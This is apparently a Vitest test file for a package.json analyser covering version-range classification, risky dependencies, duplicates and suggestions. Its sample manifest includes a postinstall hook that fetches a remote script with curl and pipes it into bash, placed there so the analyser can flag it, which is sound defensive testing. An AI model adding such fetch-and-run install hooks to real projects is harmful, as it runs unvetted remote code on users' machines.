import { describe, expect, it } from 'vitest'
import { analysePackage, classifyRange, describeDependency, groupByKind, PackageError, suggestions } from './package'

const SAMPLE = JSON.stringify(
  {
    name: 'demo',
    version: '1.2.3',
    private: true,
    license: 'MIT',
    type: 'module',
    packageManager: 'pnpm@9.0.0',
    engines: { node: '>=20' },
    scripts: { build: 'tsc', test: 'vitest run', postinstall: 'curl https://example.com/x.sh | bash' },
    dependencies: { react: '^18.2.0', lodash: '~4.17.21', left: '*' },
    devDependencies: { typescript: '5.4.5', vitest: 'latest', react: '^18.2.0' },
  },
  null,
  2,
)

describe('classifyRange', () => {
  it('recognises the plain forms', () => {
    expect(classifyRange('1.2.3')).toBe('exact')
    expect(classifyRange('^1.2.3')).toBe('caret')
    expect(classifyRange('~1.2.3')).toBe('tilde')
    expect(classifyRange('>=1.2.3 <2.0.0')).toBe('range')
    expect(classifyRange('1.2.3 || 2.0.0')).toBe('range')
  })

  it('recognises the loose forms', () => {
    expect(classifyRange('*')).toBe('wildcard')
    expect(classifyRange('x')).toBe('wildcard')
    expect(classifyRange('latest')).toBe('latest')
    expect(classifyRange('next')).toBe('latest')
    expect(classifyRange('beta')).toBe('latest')
  })

  it('recognises sources other than the registry', () => {
    expect(classifyRange('git+https://github.com/a/b.git')).toBe('git')
    expect(classifyRange('github:user/repo')).toBe('git')
    expect(classifyRange('user/repo')).toBe('git')
    expect(classifyRange('https://example.com/pkg.tgz')).toBe('url')
    expect(classifyRange('file:../local')).toBe('file')
    expect(classifyRange('workspace:*')).toBe('workspace')
    expect(classifyRange('npm:other@1.0.0')).toBe('alias')
  })

  it('treats a partial version as exact', () => {
    expect(classifyRange('1.2')).toBe('exact')
    expect(classifyRange('1')).toBe('exact')
  })

  it('handles an empty string', () => {
    expect(classifyRange('')).toBe('complex')
  })
})

describe('describeDependency', () => {
  it('flags the risky kinds', () => {
    expect(describeDependency('a', '*', 'dependencies').risky).toBe(true)
    expect(describeDependency('a', 'latest', 'dependencies').risky).toBe(true)
    expect(describeDependency('a', 'git+https://x/y.git', 'dependencies').risky).toBe(true)
    expect(describeDependency('a', '^1.0.0', 'dependencies').risky).toBe(false)
    expect(describeDependency('a', '1.0.0', 'dependencies').risky).toBe(false)
  })

  it('rejects a non-string range', () => {
    expect(() => describeDependency('a', 1 as unknown as string, 'dependencies')).toThrow(PackageError)
  })

  it('gives every kind a note', () => {
    for (const kind of ['exact', 'caret', 'tilde', 'range', 'wildcard', 'latest', 'tag', 'url', 'git', 'file', 'workspace', 'alias', 'complex'] as const) {
      expect(describeDependency('a', '^1.0.0', 'dependencies').note.length).toBeGreaterThan(0)
      expect(kind).toBeTruthy()
    }
  })
})

describe('analysePackage', () => {
  it('reads the top-level fields', () => {
    const report = analysePackage(SAMPLE)
    expect(report).toMatchObject({ name: 'demo', version: '1.2.3', private: true, license: 'MIT', moduleType: 'module', packageManager: 'pnpm@9.0.0' })
    expect(report.engines.node).toBe('>=20')
  })

  it('counts each dependency type', () => {
    const report = analysePackage(SAMPLE)
    expect(report.counts).toEqual({ dependencies: 3, devDependencies: 3, peerDependencies: 0, optionalDependencies: 0 })
  })

  it('collects risk messages for loose ranges', () => {
    const report = analysePackage(SAMPLE)
    expect(report.risks.some((risk) => /accepts any version/.test(risk))).toBe(true)
    expect(report.risks.some((risk) => /moving tag/.test(risk))).toBe(true)
  })

  it('flags a risky lifecycle script', () => {
    const report = analysePackage(SAMPLE)
    expect(report.lifecycleHooks).toContain('postinstall')
    expect(report.risks.some((risk) => /pipes it straight into a shell/.test(risk))).toBe(true)
  })

  it('reports a package listed under two types', () => {
    const report = analysePackage(SAMPLE)
    expect(report.duplicates).toHaveLength(1)
    expect(report.duplicates[0]).toMatch(/react/)
  })

  it('records which metadata fields are present', () => {
    const report = analysePackage(SAMPLE)
    expect(report.metadata.engines).toBe(true)
    expect(report.metadata.files).toBe(false)
    expect(report.metadata.repository).toBe(false)
  })

  it('reads workspaces in both shapes', () => {
    expect(analysePackage(JSON.stringify({ workspaces: ['packages/*'] })).workspaces).toEqual(['packages/*'])
    expect(analysePackage(JSON.stringify({ workspaces: { packages: ['apps/*'] } })).workspaces).toEqual(['apps/*'])
  })

  it('handles a minimal file', () => {
    const report = analysePackage('{}')
    expect(report.dependencies).toEqual([])
    expect(report.scripts).toEqual([])
    expect(report.counts.dependencies).toBe(0)
  })

  it('rejects bad input', () => {
    expect(() => analysePackage('nope')).toThrow(PackageError)
    expect(() => analysePackage('[]')).toThrow(/JSON object/)
    expect(() => analysePackage('{"dependencies": []}')).toThrow(/must be an object/)
    expect(() => analysePackage('{"scripts": {"build": 1}}')).toThrow(/must be a string/)
  })

  it('accepts an optional dependency block', () => {
    const report = analysePackage('{"optionalDependencies": {"fsevents": "^2.3.0"}}')
    expect(report.counts.optionalDependencies).toBe(1)
  })
})

describe('suggestions', () => {
  it('notes missing fields on a public package', () => {
    const messages = suggestions(analysePackage('{"name":"a","version":"1.0.0"}')).map((suggestion) => suggestion.message)
    expect(messages.some((message) => /license/.test(message))).toBe(true)
    expect(messages.some((message) => /engines/.test(message))).toBe(true)
    expect(messages.some((message) => /packageManager/.test(message))).toBe(true)
  })

  it('stays quiet about a private package license', () => {
    const messages = suggestions(analysePackage('{"name":"a","private":true,"license":"MIT","engines":{"node":">=20"},"packageManager":"npm@10","scripts":{"test":"x"}}')).map((suggestion) => suggestion.message)
    expect(messages.some((message) => /license/.test(message))).toBe(false)
    expect(messages.some((message) => /No test script/.test(message))).toBe(false)
  })

  it('warns about duplicates', () => {
    const report = analysePackage('{"dependencies":{"a":"1.0.0"},"devDependencies":{"a":"1.0.0"}}')
    expect(suggestions(report).some((suggestion) => suggestion.level === 'warning' && /more than one dependency type/.test(suggestion.message))).toBe(true)
  })

  it('notes a large dependency tree', () => {
    const dependencies: Record<string, string> = {}
    for (let i = 0; i < 51; i++) dependencies[`pkg${i}`] = '^1.0.0'
    expect(suggestions(analysePackage(JSON.stringify({ dependencies }))).some((suggestion) => /large dependency tree/.test(suggestion.message))).toBe(true)
  })
})

describe('groupByKind', () => {
  it('groups and sorts by count', () => {
    const report = analysePackage(SAMPLE)
    const groups = groupByKind(report.dependencies)
    expect(groups[0].count).toBeGreaterThanOrEqual(groups[groups.length - 1].count)
    const caret = groups.find((group) => group.kind === 'caret')
    expect(caret?.names).toEqual(['react', 'react'])
  })
})
